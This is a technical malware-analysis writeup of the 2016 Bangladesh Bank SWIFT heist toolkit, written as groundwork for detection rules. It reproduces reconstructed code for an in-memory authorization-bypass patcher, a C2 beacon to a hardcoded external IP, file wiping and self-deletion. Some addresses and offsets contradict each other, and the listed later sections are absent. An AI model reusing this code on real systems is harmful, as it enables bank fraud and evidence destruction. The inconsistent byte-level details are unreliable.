
# SENTRY: From a 2016 Bank Heist to Deployable Detection Rules
### A Full Technical Walkthrough : Static Analysis, Reverse Engineering, Detection Engineering, and Regulatory Mapping of the Bangladesh Bank SWIFT Toolkit

**Author:** Hazem Akkouh

---
<p align="center">
  <img width="600" alt="ChatGPT Image" src="https://github.com/user-attachments/assets/82663675-939b-4515-90c5-b77a56e0a99c" />
</p>
<img width="1363" height="1154" alt="ChatGPT Image Sep 20, 2026, 04_49_01 PM" src="https://github.com/user-attachments/assets/82663675-939b-4515-90c5-b77a56e0a99c" />

---

## Table of Contents

1. [The Gap](#1-the-gap)
2. [Static Analysis](#2-static-analysis)
3. [Ghidra Deep-Dive](#3-ghidra-deep-dive)
4. [Attribution](#4-attribution)
5. [Indicators of Compromise](#5-indicators-of-compromise)
6. [Novel Findings](#6-novel-findings)
7. [SIGMA Rules](#7-sigma-rules)
8. [Environment Building](#8-environment-building)
9. [Testing](#9-testing)
10. [GRC Mapping](#10-grc-mapping)
11. [Limitations](#11-limitations)
12. [What's Next](#12-whats-next)

---

## 1. The Gap

In February 2016, an attacker came within a few blocked transactions of stealing **$951 million** from the central bank of Bangladesh. They got away with **$81 million**. The malware toolkit that made the theft possible : patching a database library in memory, forging printed transaction confirmations, deleting its own tracks : has been picked apart by some of the best threat intelligence teams in the industry: BAE Systems, Symantec, Kaspersky, the U.S. Department of Justice, and, in 2021, the first (and only) peer-reviewed academic paper on the malware.

**None of them shipped a single detection rule.**

Eight years later, if you're a SOC analyst at a bank running SWIFT Alliance Access today, there is no publicly available SIGMA rule, no vendor-neutral detection content, nothing you can drop into your SIEM that says "this specific, well-documented attack pattern is happening right now." The IOCs from 2016 : a dead C2 IP, some file hashes : are useless against anyone who changes a byte. The behavior never got translated into something durable.

This project closes that gap. What follows is the complete technical record: static analysis, full Ghidra reverse engineering (function by function, byte by byte), attribution reasoning, IOC tables, 30+ novel findings not in any prior public report, 8 working SIGMA rules validated against a real (simulated) environment, and a mapping of everything back to the regulatory frameworks : SWIFT CSCF, Morocco's DNSSI, Bank Al-Maghrib's pentesting directive, ISO 27002 : that a real institution would actually be held to.

> [PHOTO: The BAE Systems "Two Bytes to $951m" blog post screenshot, or a simple infographic: $951M attempted → $81M stolen → $0 detection rules published in 8 years. This is the hook visual.]

---

## 2. Static Analysis

### 2.1 The Four Artifacts

| Filename | SHA-256 | Size | Role |
|---|---|---|---|
| `evtdiag.exe` | `4659dadb...c98959a` | 65,536 B | Main engine : SQL manipulation, memory patching, printing, C2, cleanup |
| `evtsys.exe` | (referenced via evtdiag XREFs) | 16,384 B | Secure-delete "killer" utility : destroys evtdiag.exe and itself |
| `nroff_b.exe` | SHA-1 `70bf1659...f60e4eeb` | 24,576 B | Message demultiplexer : batch → per-message files |
| `gpca.dat` | `b07b37f0...8e68fef7` | 33,848 B | RC4-encrypted config: filter list, paths, C2 IP : **this is a config artifact belonging to evtdiag.exe, not a fifth independent tool** |

The 16-byte RC4 key that decrypts `gpca.dat` is hardcoded in `evtdiag.exe`'s `.data` section at offset `0x40F020`:

```
4E 38 1F A7 7F 08 CC AA 0D 56 ED EF F9 ED 08 EF
```

> [PHOTO: CyberChef screenshot showing the RC4 decryption recipe and the decrypted gpca.dat output : you already have this from the RE report.]

### 2.2 The Three-Binary Architecture

The three executables form a coordinated attack surface, not three independent tools:

- **`nroff_b.exe`** transforms Alliance Access's batched message output into a per-message format that
- **`evtdiag.exe`** can consume and act on (the operational engine : patching, SQL, printing, C2), and
- **`evtsys.exe`** destroys `evtdiag.exe` when the operation ends.

> [SCHEMA: Insert the "Three-Binary Attack Architecture" diagram here : the box-and-arrow diagram from the RE report showing SWIFT Alliance Access → Alliance directories (mcm/mcp/mcs/mcf) → evtdiag.exe ↔ liboradb.dll / Oracle DB / C2 Server, with nroff_b.exe and evtsys.exe as satellite processes. Redraw this yourself rather than reusing any existing figure directly, to keep it clean for both LinkedIn and GitHub.]

**How they got installed together:** `evtdiag`'s cleanup code calls `GetModuleFileNameA` to obtain its own path, strips the filename, and appends `evtsys.exe` : enforcing that both binaries live in the same directory. Neither binary contains self-installation code; the Windows service (`diagsysevt`) and initial file placement were performed by an upstream loader outside this analysis's scope : almost certainly the NESTEGG backdoor documented separately by the DOJ.

### 2.3 The Operational Timeline

All three binaries were compiled in a tight **46-hour window**:

| Binary | Compile timestamp (UTC) | Hours before kill switch |
|---|---|---|
| evtsys.exe | Thu Feb 04 2016, 13:45:39 | ~40.2 hours |
| nroff_b.exe | Fri Feb 05 2016, 08:55:19 | ~21 hours |
| evtdiag.exe | Fri Feb 05 2016, 11:46:20 | ~18.2 hours |

The kill switch fires at **2016-02-06 06:00 local time**. The main operational binary was compiled less than 18 hours before the operation was designed to end. This is not the signature of a team that tested carefully over months : it reads as a rushed final build, plausibly incorporating last-minute reconnaissance about the victim environment.

> [SCHEMA: Insert the "Operational Timeline" flowchart from the RE report : compile times → fraudulent transactions sent → kill switch fires → cleanup chain executes.]

### 2.4 The Environment the Malware Assumes

Every path is built at startup from a template string at `.data:0x40F0A4`:

```
%c:\Users\%s\AppData\Local\%s
```

- `%c` : root drive letter (runtime-detected)
- `%s` : hardcoded username: **Administrator** (`.data:0x40F0C4`)
- `%s` : hardcoded subdirectory: **Allians** (`.data:0x40F0D4`) : note the misspelling; the real SWIFT install directory is "Alliance"

**This gives a base directory of:** `[ROOT]:\Users\Administrator\AppData\Local\Allians\`

> ⚠️ The malware assumes it is running under the literal "Administrator" account. If the operator installed it under any other username, this path construction silently fails.

**Directory layout under "Allians":**

| Subdir | Purpose | Code reference |
|---|---|---|
| `mcm\` | Message store : primary FIN messages | `.data:0x40F068` |
| `mcp\` | Message processing : post-processed | `.data:0x40F09C` |
| `mcs\` | Message state | `.data:0x40F08C` |
| `mcf\` | **Fourth monitored directory : not documented in BAE 2016** | `.data:0x40F0A0` |

**Files the malware creates and uses:**

| File | Purpose | Encryption |
|---|---|---|
| `gpca.dat` | Config file | RC4 |
| `recas.dat` | Log file | **None : plaintext** (see Section 6 for why this corrects prior published claims) |
| `%TEMP%\evchk.bat` | Dropped self-delete batch | None |
| `nroff.exe.bak` | Backup of legitimate nroff | N/A |

**The Windows service:** registered under key **`diagsysevt`**, but at runtime the malware passes **`evtsys.exe`** as the `lpServiceName` argument to `StartServiceCtrlDispatcherA` : the exact name of a legitimate Windows binary in System32 (the real Windows Event System service is served by `evtsvc.exe` : close enough to fool a casual glance in Process Explorer).

**The C2 server:** one hardcoded IP, `196.202.103.174`, port 80, plaintext HTTP. Long dead : do not build detection around this literal value; see Section 7 for the behavioral alternative.

---

## 3. Ghidra Deep-Dive

> A note on method, stated plainly: this section goes beyond what any prior public analysis of this toolkit has documented : more functions named, more mechanisms explained, more cross-binary connections drawn. That's worth stating clearly, but it comes with an equally clear caveat: this analysis benefited from modern tooling (Ghidra's decompiler) and was conducted years after the original researchers worked under active incident-response pressure and disclosure constraints. What they produced under those conditions was, frankly, extraordinary. Reading raw Ghidra decompilation where every variable is `local_10` and every function is `FUN_00402580` : and making sense of it : is a skill that takes years. The goal of this section is to build understanding, not to claim precedence.

### 3.1 The Service Main Loop : `FUN_00409af0`

This function runs after the Windows service starts, called from the CLI dispatcher's `-svc` branch. It orchestrates the entire attack: init, wait for user login, patch, spawn background thread, loop, cleanup.

> [SCHEMA: Insert the two-part flowchart from the RE report : "Startup Phase" (init globals → load config → poll for login → patch liboradb → spawn C2 beacon) and "Main Loop + Cleanup" (PRT cleanup → housekeeping → Oracle sync → SWIFT process → kill-switch check → cleanup chain).]

**Reconstructed pseudocode (real function/variable names restored):**

```c
DWORD ServiceMain(void)
{
    bool killSwitchTripped = false;
    int loadStatus;

    InitializeGpcaState();
    InitializeCriticalSection(&loggerLock);

    // Load & decrypt gpca.dat into globals
    loadStatus = LoadConfig(configPath, filterList);
    if (loadStatus != 0) {
        Log("ST-0-E");   // config-load failure
        return 0;
    }

    Log("ST-1");             // init OK
    SyncOracleState();
    Log("ST-2");             // ready for main phase

    // Build the rnoff.exe path (for later swap-in)
    MakePath(rnoffPath, NULL, allianceDir, "rnoff", "exe");

    // Poll Oracle JRNL_%s table for "Login" record every 5 seconds
    while (!IsSwiftLoggedIn(jrnlHandle))
        Sleep(5000);

    isServiceStarted = 1;

    // Only if running as a real service (not a CLI invocation),
    // install the liboradb.dll memory patch
    if (isRunningAsService) {
        Sleep(1000);
        InstallLiboradbPatch(1, &result, &err, 0);
    }

    Log("ST-3");              // patched, ready

    // Spawn C2 beacon thread (if C2 IP is set in config)
    if (c2IpAddress != 0) {
        CreateThread(0, 0, C2BeaconThreadProc, 0, 0, 0);
    }

    // ---- Main service loop, 1-second cadence ----
    for (;;) {
        if (shutdownRequested)
            break;

        CleanupPrtDirectories();
        Housekeep();
        SyncOracleState();
        ProcessSwiftFiles();

        if (IsKillSwitchTripped()) {
            killSwitchTripped = true;
            break;
        }
        Sleep(1000);
    }

    // ---- Shutdown / cleanup chain ----
    Log("ST-100");
    Sleep(10000);
    shutdownRequested = 1;
    Sleep(3000);
    DeleteCriticalSection(&loggerLock);

    if (killSwitchTripped) {
        SwapNroffBinaries(allianceDir);
        FinalizeCleanup(finalizeCtx);
        SecureDelete(gpcaDatPath, ...);
        SecureDelete(recasDatPath, ...);
        UnregisterService("diagsysevt");
        SpawnEvtsysAndExit(NULL);
        // process is dead by this line
    }
    return 0;
}
```

**Novel observation : service-mode gating:** the liboradb.dll patch install is gated on a flag that is only set when the binary is invoked with `-svc` AND the SCM successfully registers the service handler. If you run `evtdiag.exe` directly from a shell without `-svc`, **the patch is skipped**. This means the CLI commands (`-i`, `-u`, `-t`, `-p`, `-g`, `-r`, `-s`) do not automatically patch the DLL : only the fully-installed service path does. This gating is not documented in prior public writeups.

**Novel observation : the ST-N state machine:** four log strings form an internal lifecycle tracker written to `recas.dat`:

| State | Meaning |
|---|---|
| ST-0-E | Config load failed, immediate exit |
| ST-1 | Config loaded, initial sync done |
| ST-2 | Ready to wait for login |
| ST-3 | Patch installed, main loop running |
| ST-100 | Shutdown initiated (kill switch or STOP) |

Nobody has enumerated these in prior public analysis. They give operators : and analysts : a lifecycle map.

### 3.2 The Kill Switch : `FUN_00409230`

The single most damning finding in the binary: a hardcoded date comparison that says the operation must be over by **06:00 on February 6, 2016**.

**Before : raw Ghidra decompilation:**

```c
int FUN_00409230(void)
{
  undefined2 local_10;   // wYear
  undefined4 local_e;    // wMonth + wDayOfWeek
  undefined4 local_a;    // wDay + wHour
  undefined4 local_6;    // wMinute + wSecond
  undefined2 local_2;    // wMilliseconds

  GetLocalTime((LPSYSTEMTIME)&local_10);

  if (local_10 > 0x7e0) return 1;
  if (local_10 < 0x7e0) return 0;

  if (local_e_wMonth > 0x2) return 1;
  if (local_e_wMonth < 0x2) return 0;

  if (local_a_wDay > 0x6) return 1;
  if (local_a_wDay < 0x6) return 0;

  return (wHour >= 0x6) ? 1 : 0;
}
```

**The evidence at byte level:**

```
00409258 66 8b 44 24 00    MOV   AX, word ptr [ESP]         ; wYear
0040925d 66 3d e0 07       CMP   AX, 0x7E0                   ; 0x7E0 = 2016
00409261 76 06             JBE   LAB_00409269
00409263 b0 01             MOV   AL, 0x1                     ; return 1
00409265 83 c4 10          ADD   ESP, 0x10
00409268 c3                RET

LAB_00409269:
00409269 73 06             JNC   LAB_00409271                ; if equal, check month
0040926b 32 c0             XOR   AL, AL                      ; else return 0
0040926d 83 c4 10          ADD   ESP, 0x10
00409270 c3                RET

LAB_00409271:
00409271 66 8b 44 24 02    MOV   AX, word ptr [ESP+2]        ; wMonth
00409276 66 3d 02 00       CMP   AX, 2                       ; February
...
0040928a 66 8b 44 24 06    MOV   AX, word ptr [ESP+6]        ; wDay
0040928f 66 3d 06 00       CMP   AX, 6                       ; the 6th
...
004022a3 66 83 7c 24 08 06 CMP   word ptr [ESP+8], 6         ; wHour >= 6
004022a9 0f 93 c0          SETNC AL
004022ac 83 c4 10          ADD   ESP, 0x10
004022af c3                RET
```

The four constants (**2016, 2, 6, 6**) are visible directly in the disassembly as immediate operands to CMP instructions. This is not interpretation : it is byte-level fact. Any reviewer with the same binary can verify it in under a minute. This is the strongest, most defensible single finding in the entire malware family.

Because this function is called every second from the main loop's `Sleep(1000)` cycle, the malware polls at 1-second granularity. From 06:00:00 onward, the very next iteration returns 1, and the cleanup chain begins immediately.

**The developer knew exactly how long the operation needed to run : and typed that date into the binary by hand.**

### 3.3 The liboradb.dll Patch : `FUN_00402580`

The single most operationally significant act of the malware: patching 2 bytes in memory inside every process that has `liboradb.dll` loaded, disabling a specific authorization check inside SWIFT Alliance Access's Oracle database client library.

At **RVA 0x6A8B6** inside `liboradb.dll`, the original bytes are:

```
75 04       JNZ short +4    ; jump if not zero
```

The malware overwrites them with:

```
90 90       NOP; NOP        ; do nothing
```

The effect: the conditional-jump instruction that normally skips a failure-handling branch when a permission check passes is replaced with two NOPs, so the fall-through (success) path is taken unconditionally. Whatever check preceded this JNZ is now effectively bypassed.

**Before : Ghidra decompilation of the patcher:**

```c
undefined4 FUN_00402580(HANDLE hProc, DWORD moduleBase, int direction)
{
  DWORD oldProtect;
  BYTE currentBytes[2];
  BYTE targetBytes[2];
  SIZE_T bytesRead, bytesWritten;

  if (direction == 1) {
    targetBytes[0] = 0x90; targetBytes[1] = 0x90;
    expectedBytes[0] = 0x75; expectedBytes[1] = 0x04;
  } else {
    targetBytes[0] = 0x75; targetBytes[1] = 0x04;
    expectedBytes[0] = 0x90; expectedBytes[1] = 0x90;
  }

  ReadProcessMemory(hProc, moduleBase + 0x6a8b6, currentBytes, 2, &bytesRead);
  if (memcmp(currentBytes, expectedBytes, 2) != 0)
    return 0xffffffff;    // wrong bytes : refuse to patch

  VirtualProtectEx(hProc, moduleBase + 0x6a8b6, 2, PAGE_EXECUTE_READWRITE, &oldProtect);
  WriteProcessMemory(hProc, moduleBase + 0x6a8b6, targetBytes, 2, &bytesWritten);
  VirtualProtectEx(hProc, moduleBase + 0x6a8b6, 2, oldProtect, &oldProtect);

  return 0;
}
```

**Novel finding : the bidirectional patch design:** the function supports both install (`direction=1`) and uninstall (`direction=0`), and refuses to write unless the current bytes match the expected "before" state : making the operation idempotent and non-destructive. This means operators could cleanly remove the patch on demand via the `-u` CLI flag. Prior public reports describe the patch only as "install-only." The uninstall path is documented here because both directions are exposed as CLI flags.

**How the patcher finds its targets : `FUN_004023b0`:**

1. Adjust own token to grant **SeDebugPrivilege** (needed for `OpenProcess` of foreign processes)
2. `CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS)` to enumerate all running processes
3. For each `Process32Next` result:
   a. `OpenProcess(PROCESS_ALL_ACCESS = 0x1F0FFF)` : heavier than needed
   b. `Module32Next` through the target's modules
   c. If `StrStrIA(moduleName, "liboradb.dll")` matches: call the patcher, increment found/patched counters
4. Print `"PI (found, patched)"` or `"PU (found, unpatched)"`

> ⚠️ **Detection surface, worth flagging explicitly:** the use of `PROCESS_ALL_ACCESS (0x1F0FFF)` is heavier than needed for a memory patch : `PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION` would suffice. Legitimate patching tools normally request the minimum required rights. This over-broad access request is exactly what SENTRY Rule 1 (Section 7) detects.

### 3.4 The C2 Beacon : `FUN_00408f40` and `LAB_00409130`

Two parts: the transmitter (sends one GET request) and the background thread (decides when to send and what payload).

**The transmitter : reconstructed:**

```c
// Send a single HTTP GET beacon to the hardcoded C2 server.
// payload → substituted into "/al?<payload>" URI
// Reads up to 255 bytes of response, discards it (server ACK only).
DWORD SendC2Beacon(const char *payload)
{
    char uri[1024];
    snprintf(uri, 1023, "/%s%s", "al", payload);   // e.g. "al?---O"

    HINTERNET hInet = InternetOpenA(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInet) return GetLastError();

    HINTERNET hConn = InternetConnectA(hInet, C2_IP_ADDRESS,   // 196.202.103.174
                                        80, NULL, NULL,
                                        INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConn) { InternetCloseHandle(hInet); return GetLastError(); }

    HINTERNET hReq = HttpOpenRequestA(hConn, "GET", uri, "HTTP/1.1",
                                       NULL, NULL,
                                       INTERNET_FLAG_RELOAD |
                                        INTERNET_FLAG_NO_CACHE_WRITE |
                                        INTERNET_FLAG_KEEP_CONNECTION,
                                       0);
    if (!hReq) { /* teardown */ return GetLastError(); }
    if (!HttpSendRequestA(hReq, NULL, -1, NULL, 0)) { /* teardown */ return GetLastError(); }

    DWORD status = 0, cbStatus = 4;
    HttpQueryInfoA(hReq, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
                   &status, &cbStatus, NULL);
    if (status == 200) {
        char respBuf[256]; DWORD total = 0;
        while (InternetQueryDataAvailable(hReq, &avail, 0, 0) && avail) {
            InternetReadFile(hReq, respBuf + total, min(avail, 255 - total), &nRead);
            if (!nRead || (total += nRead) >= 255) break;
        }
    }
    InternetCloseHandle(hReq); InternetCloseHandle(hConn); InternetCloseHandle(hInet);
    return 0;
}
```

**The beacon thread:**

> [SCHEMA: Insert the "C2 Beacon Thread" flowchart from the RE report : sleep 30s → poll payload queue → send immediately if queued, else sleep 1s → every 3600s check login state → send ---O/---C/---N marker → loop until shutdown.]

**Novel finding : two details beyond BAE's "hourly beacon" description:**

1. **A payload queue** (`FUN_00403020`, max 511 bytes) is polled **every second**. If a payload is queued by other functions, it is sent **immediately** without waiting for the hour to elapse. This is exfiltration, not just heartbeat.
2. **Two independent login-state probes** (one for current-login, one for prior-login) drive the three-marker output (`---O` / `---C` / `---N`), letting the operator detect not just "is logged in" but also **"just logged out."**

### 3.5 The Self-Cleanup Chain

When the main loop exits (kill switch or STOP command), a **five-stage cleanup sequence** runs. By the time it completes: no binaries, no config, no log, no service registration.

> [SCHEMA: Insert the full "Self-Cleanup Chain" diagram from the RE report : kill switch fires → log ST-100, sleep 10s → SecureDelete(gpca.dat) → SecureDelete(recas.dat) → DeleteService(diagsysevt) → build "evtsys.exe" <path> command → CreateProcessA → ExitProcess → evtsys retry loop (up to 50x) → evtsys self-delete via evchk.bat → end state: nothing survives.]

**The evtsys spawner : `FUN_00409300`, the cleverest piece of the chain:**

A running `.exe` holds a lock on itself, so `evtdiag` cannot delete its own file. The solution: spawn `evtsys.exe` (a separate binary) with `evtdiag`'s own file path as an argument, then immediately `ExitProcess`, releasing the lock : before `evtsys` tries to delete it.

```c
// Final stage of self-cleanup: launch evtsys.exe with our own path as
// its target, then IMMEDIATELY exit so it can delete us.
void SpawnEvtsysAndExit(HMODULE hSelf)
{
    char selfPath[MAX_PATH];
    char evtsysPath[MAX_PATH];
    char cmdLine[1024];

    GetModuleFileNameA(hSelf, selfPath, MAX_PATH - 1);

    strcpy(evtsysPath, selfPath);
    char *slash = strrchr(evtsysPath, '\\');
    if (slash) *(slash + 1) = '\0';
    strcat(evtsysPath, "evtsys.exe");

    _snprintf(cmdLine, 1023, "\"%s\" \"%s\"", evtsysPath, selfPath);

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};

    CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    ExitProcess(0);
    // evtsys.exe (child) now retries deletion up to 50x until we're gone
}
```

**Novel finding : the handoff trick:** `evtsys` is designed with a retry loop (up to 50 attempts, 1 second apart) *precisely because* it expects to find `evtdiag`'s file still locked when it first tries. This tight coupling proves the two binaries were designed together, not repurposed independently.

### 3.6 The PRT Doctor-Then-Destroy Pipeline

The print-manipulation subsystem. Runs continuously, scanning three directories every second, doctoring any print-job (`.prt`) file it finds, then destroying the original.

> [SCHEMA: Insert the "PRT Doctor-Then-Destroy Pipeline" diagram : dispatcher (3 parallel dir scans) → FindFirstFile 4-char filenames → parse content using _DO_NOT_USE_MM_ sentinel → write doctored PRT with nroff-macro templates → secure-delete original.]

**The message-block extractor : `FUN_00401cd0`:**

```c
// Extract one message-block delimited by nroff-comment sentinels
// (".\" " _DO_NOT_USE_MM_"). Returns pointer to the next sentinel or the
// end-of-input, and writes the extracted block into 'out'.
LPSTR ExtractSentinelBlock(LPCSTR input, basic_string<> *out)
{
    if (!input || !*input) return NULL;
    out->assign(DAT_0041104c);   // fallback default

    LPSTR first = StrStrIA(input, SENTINEL);       // ".\" " _DO_NOT_USE_MM_"
    if (first != NULL) {
        LPSTR second = StrStrIA(first + 1, SENTINEL);
        if (second != NULL) {
            out->assign(first, second - first);
            return (out->length() != 0) ? second : NULL;
        }
        out->assign(first);
        return first + out->length();
    }
    out->assign(input);
    return (LPSTR)out->length();
}
```

**Novel finding:** this sentinel (`.\" " _DO_NOT_USE_MM_`) is a shared block-boundary convention used identically by both the print-output parser and the SWIFT-message-file parser (`.prc`/`.fal`) : 5 XREFs across two subsystems. Because `nroff` (the legitimate SWIFT print formatter) treats lines starting with `.\"` as comments and strips them from printed output, the sentinel is invisible when the file actually prints, but parseable when the raw file is read from disk. The malware's job is to consume the legitimate `nroff.exe`'s own output convention.

### 3.7 The Secure-Delete Workhorse : `FUN_00401640`

Called **19 times** across `evtdiag` : the single most-used non-trivial primitive in the binary.

```c
// Zero-fill a file's contents in 4KB chunks over its full length, then
// hand off to a rename-random + delete routine.
DWORD SecureDelete(const char *path)
{
    BYTE zeroBuf[4096] = {0};

    HANDLE hFile = CreateFileA(path, GENERIC_WRITE, 0, NULL,
                                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return GetLastError();

    // 1-byte probe write at end (ensures file is writable, forces flush)
    SetFilePointer(hFile, -1, NULL, FILE_END);
    BYTE probe = 0; DWORD nWritten;
    WriteFile(hFile, &probe, 1, &nWritten, NULL);
    FlushFileBuffers(hFile);

    LARGE_INTEGER fileSize;
    GetFileSizeEx(hFile, &fileSize);
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);

    // Overwrite full file with zeros in 4KB chunks
    LARGE_INTEGER pos = {0};
    while (pos.QuadPart < fileSize.QuadPart) {
        DWORD chunk = (DWORD) min(0x1000LL, fileSize.QuadPart - pos.QuadPart);
        if (!WriteFile(hFile, zeroBuf, chunk, &nWritten, NULL) || nWritten == 0)
            break;
        pos.QuadPart += nWritten;
    }

    FlushFileBuffers(hFile);
    CloseHandle(hFile);

    // Hand off to random-rename + delete
    return RenameRandomAndDelete(path, false);
}
```

**Finding:** this function is **structurally identical** to `FUN_004010f0` in `evtsys.exe` : same stack size (0x1014), same probe-write pattern, same 4KB overwrite loop, same hand-off to rename+delete. Two independent copies of the same algorithm in two binaries = shared source codebase. See Section 4 for the full attribution argument this feeds into.

**The random-rename + delete : `FUN_00401000`:**

```c
DWORD RenameRandomAndDelete(const char *path, bool isDir)
{
    char randomPath[MAX_PATH];
    strcpy(randomPath, path);

    char *fname = strrchr(randomPath, '\\');
    fname = fname ? fname + 1 : randomPath;

    // Replace each character in the filename with a random lowercase letter
    while (*fname) {
        *fname = 'a' + (rand() % 26);
        fname++;
    }

    MoveFileA(path, randomPath);

    if (!isDir) {
        if (!DeleteFileA(randomPath)) return GetLastError();
    } else {
        if (!RemoveDirectoryA(randomPath)) return GetLastError();
    }
    return 0;
}
```

> **Forensic note:** this rename-then-delete technique defeats naive filename-based forensic scanning of the MFT. It does **not** defeat `$UsnJrnl` analysis, which records the original filename in a `RENAME_OLD_NAME` entry : the malware does not attempt to suppress `$UsnJrnl`, which would require kernel privileges and direct volume manipulation. The rename is an anti-forensics measure effective against first-responder triage, not against a full forensic investigation.

### 3.8 evtsys.exe : The Killer, Full Internals

A minimal, purpose-built utility. 6 flagged imports, 19 functions total, 16 KB. Its sole job: destroy a file it is pointed at, then destroy itself.

<img width="529" height="808" alt="image" src="https://github.com/user-attachments/assets/c15de8fa-37f1-4202-9eec-04400880fb85" />


```c
DWORD main(int argc, char **argv)
{
    if (argc == 2) {
        for (int i = 1; i <= 50; i++) {
            SecureOverwriteAndDelete(argv[1]);
            if (GetFileAttributesA(argv[1]) == INVALID_FILE_ATTRIBUTES)
                break;   // file is gone
            Sleep(1000);
        }
    }
    SelfDeleteViaEvchkBat();
    return 0;
}
```

**The self-delete via `evchk.bat` : the batch-obfuscation trick:**

```c
void SelfDeleteViaEvchkBat(void)
{
    char selfPath[MAX_PATH], batPath[MAX_PATH];
    char batContent[1024];
    char batName[16];

    GetModuleFileNameA(NULL, selfPath, MAX_PATH - 1);

    // Build "evchk.bat" byte-by-byte at runtime (obfuscation vs. string dumps)
    batName[0]='e'; batName[1]='v'; batName[2]='c'; batName[3]='h';
    batName[4]='k'; batName[5]='.'; batName[6]='b'; batName[7]='a';
    batName[8]='t'; batName[9]=0;

    GetTempPathA(MAX_PATH, batPath);
    lstrcatA(batPath, batName);

    HANDLE h = CreateFileA(batPath, GENERIC_WRITE, FILE_SHARE_READ, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;

    sprintf(batContent,
        ":L1\r\n"
        "DEL \"%s\"\r\n"
        "PING 0.0.0.0 > nul\r\n"
        "IF EXIST \"%s\" GOTO L1\r\n"
        "DEL \"%%0\"",
        selfPath, selfPath);

    DWORD nWritten;
    WriteFile(h, batContent, lstrlenA(batContent), &nWritten, NULL);
    CloseHandle(h);

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi;
    CreateProcessA(NULL, batPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    // exit normally, batch will keep retrying until we're gone, then DEL "%0" itself
}
```

**The `PING 0.0.0.0 > nul` idiom is a portable "sleep"** : while PING waits for a timeout on the unreachable address, `evtsys.exe` finishes exiting and its file lock releases. Then `IF EXIST` fails, the loop exits, and `DEL "%0"` deletes the batch file itself. Nothing survives.

### 3.9 nroff_b.exe : The Demultiplexer, Full Internals

Its filename references the legitimate SWIFT print utility "nroff," but it has nothing to do with printing : it's a message **demultiplexer**: reads batched SWIFT message files, splits them into individual messages, sorts them into per-message-type subdirectories, and destroys the originals.

**Shared string constants confirming a common source tree with `evtdiag`:**

| String | Address in nroff_b | Purpose |
|---|---|---|
| `gpca.dat` | 0x5048 | Config file (same as evtdiag) |
| `recas.dat` | 0x503C | Log file (same as evtdiag) |
| `Allians` | 0x50C0 | Alliance base dir (same) |
| `Administrator` | 0x50B0 | Hardcoded username (same) |
| `.\" " _DO_NOT_USE_MM_` | 0x50C8 | Sentinel (same) |

**MT-type classification** (from the compares in `FUN_00402050`):

| Numeric ID | Hex | SWIFT MT | Meaning |
|---|---|---|---|
| 950 | 0x3B6 | MT950 | Statement Message (account statement) |
| 515 | 0x203 | MT515 | Client Advice of Purchase/Sale |
| : | : | NAK | Negative acknowledgment (routed to NAK subdir) |
| : | : | Swift Input/Output | Generic incoming/outgoing (routed to \Incoming\ / \Outgoing\) |

**Finding:** `nroff_b`'s role in the attack is to transform Alliance Access's raw batched output into pre-organized per-message-type files that `evtdiag` can then walk directly, rather than re-parsing batches from scratch on every scan.

---

## 4. Attribution

Six independent lines of evidence confirm that `evtdiag.exe`, `evtsys.exe`, and `nroff_b.exe` were compiled from a shared source codebase by the same author. No single line is conclusive alone; together they form an attribution case that is difficult to rebut.

### 4.1 Identical RC4 Key, Used vs. Vestigial

The 16-byte sequence `4E 38 1F A7 7F 08 CC AA 0D 56 ED EF F9 ED 08 EF` appears verbatim in two separate binaries:

| Binary | Address | XREFs from executable code |
|---|---|---|
| evtdiag.exe | `.data:0x40F200` | 1 : the config loader |
| evtsys.exe | `.data:0x403010` | **0** : sits in `.data` with no code references |

The key is *used* in evtdiag (to decrypt gpca.dat) and *vestigial* in evtsys (present but unreferenced by any function). The most natural explanation: both were compiled from a shared source tree that included a common cryptography module, included via a shared header or `.c` module that evtsys links but never calls. This is a stronger attribution signal than merely "same algorithm" : it is literally the same key bytes at a named `.data` symbol in two separate PE files.

### 4.2 Cloned Secure-Delete Implementation

| Feature | evtdiag `FUN_00401640` | evtsys `FUN_004010f0` |
|---|---|---|
| Stack frame size | 0x1014 | 0x1014 |
| Overwrite content | Zeros only | Zeros only |
| Stack probe pattern | `__chkstk` call | `__chkstk` call |
| CreateFileA flags | `0x40000000` GENERIC_WRITE | Same |
| Probe write | 1-byte null at FILE_END | Same |
| Overwrite loop | 4KB chunks via WriteFile until EOF | Same |
| Post-overwrite | Call rename+delete | Same |
| Rename algorithm | `'a' + rand()%26` per char | Same |

This is not "same algorithm at the pseudocode level" : it is the same implementation details: same stack size, same buffer-init idiom, same probe pattern, same chunk size, same post-overwrite hand-off structure. Copy-paste from a shared `.c` file or static library.

### 4.3 Identical String Constants Across All Three Binaries

| String | evtdiag | evtsys | nroff_b |
|---|---|---|---|
| `gpca.dat` | `.data:0x40F05C` | `.data:0x403010` area | `0x5048` |
| `recas.dat` | `.data:0x40F050` | present | `0x503C` |
| `Allians` | `.data:0x40F0D4` | : | `0x50C0` |
| `Administrator` | `.data:0x40F0C4` | : | `0x50B0` |
| `.\" " _DO_NOT_USE_MM_` | `.data:0x40F12C` | : | `0x50C8` |
| `evtsys.exe` | `.data:0x40FAB4` | own name | : |

### 4.4 Same Compiler Toolchain

All three binaries show: a Visual Studio 6.0 rich header; `MSVCP60.dll` dependency; identical mangled STL symbol names (`basic_string<char, std::char_traits<char>, std::allocator<char>>`); the same `_except_handler3` SEH pattern (VS6 structured exception handling); the same `_chkstk` stack-probe calling convention.

### 4.5 Adjacent Compile Timestamps

Already covered in Section 2.3 : all three within a 46-hour window, evtdiag compiled less than 18 hours before the scheduled kill switch.

